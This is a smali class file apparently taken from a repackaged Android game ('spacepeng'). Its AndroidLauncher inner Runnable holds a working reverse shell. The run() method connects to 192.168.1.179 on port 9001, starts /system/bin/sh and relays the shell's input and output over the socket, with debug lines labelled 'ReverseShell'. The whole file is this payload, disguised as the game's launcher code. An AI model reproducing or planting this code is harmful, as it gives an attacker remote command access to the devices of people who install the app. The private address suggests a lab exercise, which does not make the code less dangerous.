.class Lde/fgerbig/spacepeng/android/AndroidLauncher$1;
.super Ljava/lang/Object;
.source "AndroidLauncher.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic this$0:Lde/fgerbig/spacepeng/android/AndroidLauncher;


# direct methods
.method constructor <init>(Lde/fgerbig/spacepeng/android/AndroidLauncher;)V
    .locals 0

    .prologue
    iput-object p1, p0, Lde/fgerbig/spacepeng/android/AndroidLauncher$1;->this$0:Lde/fgerbig/spacepeng/android/AndroidLauncher;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    const/4 v9, 0x0

    :try_start_0
    # Debug
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;
    const-string v1, "ReverseShell: Connecting to 192.168.1.179:9001..."
    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    # Crea socket
    new-instance v0, Ljava/net/Socket;

    const-string v1, "192.168.1.179"

    const/16 v2, 0x2329    # Porta 9001

    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    .local v0, "socket":Ljava/net/Socket;
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;
    const-string v2, "ReverseShell: Connected!"
    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    # Esegui /system/bin/sh
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "/system/bin/sh"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v8
    .local v8, "process":Ljava/lang/Process;

    # Ottieni stream
    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .local v3, "socketIn":Ljava/io/InputStream;
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    .local v4, "socketOut":Ljava/io/OutputStream;
    invoke-virtual {v8}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    .local v5, "processIn":Ljava/io/InputStream;
    invoke-virtual {v8}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v6

    .local v6, "processErr":Ljava/io/InputStream;
    invoke-virtual {v8}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    .local v7, "processOut":Ljava/io/OutputStream;
    # Thread per stdout -> socket
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lde/fgerbig/spacepeng/android/AndroidLauncher$1$1;

    invoke-direct {v2, p0, v5, v4}, Lde/fgerbig/spacepeng/android/AndroidLauncher$1$1;-><init>(Lde/fgerbig/spacepeng/android/AndroidLauncher$1;Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    # Thread per stderr -> socket
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lde/fgerbig/spacepeng/android/AndroidLauncher$1$2;

    invoke-direct {v2, p0, v6, v4}, Lde/fgerbig/spacepeng/android/AndroidLauncher$1$2;-><init>(Lde/fgerbig/spacepeng/android/AndroidLauncher$1;Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    # Main loop: socket -> stdin
    const/16 v1, 0x400

    new-array v1, v1, [B

    :goto_0
    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    move-result v2

    if-lez v2, :cond_0

    invoke-virtual {v7, v1, v9, v2}, Ljava/io/OutputStream;->write([BII)V

    invoke-virtual {v7}, Ljava/io/OutputStream;->flush()V

    goto :goto_0

    :cond_0
    invoke-virtual {v8}, Ljava/lang/Process;->destroy()V

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    return-void

    :catch_0
    move-exception v0

    sget-object v1, Ljava/lang/System;->err:Ljava/io/PrintStream;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ReverseShell Error: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto :goto_1
.end method
